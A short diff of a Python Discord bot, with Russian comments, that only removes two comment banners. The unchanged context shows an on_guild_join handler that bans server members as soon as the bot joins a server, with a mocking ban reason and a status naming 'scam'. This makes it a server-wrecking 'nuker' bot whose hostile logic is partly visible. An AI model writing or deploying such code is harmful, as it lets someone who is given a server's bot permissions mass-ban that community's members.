@@ -18,8 +18,6 @@ async def on_ready():
     await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="Скам - Scally Milano")) 
     print('Connected to bot: {}'.format(bot.user.name))
 
-#-------commands-------
-
 @bot.event
 async def on_guild_join(server):
     a = 30
@@ -35,8 +33,6 @@ async def on_guild_join(server):
             await member.ban(reason='ahahahha')
         except:
             print('xd')
-
-#---------end----------
 
 # последние строчки насчет бана работают через жопу, так что бот может просто спамить в консоль :)
 
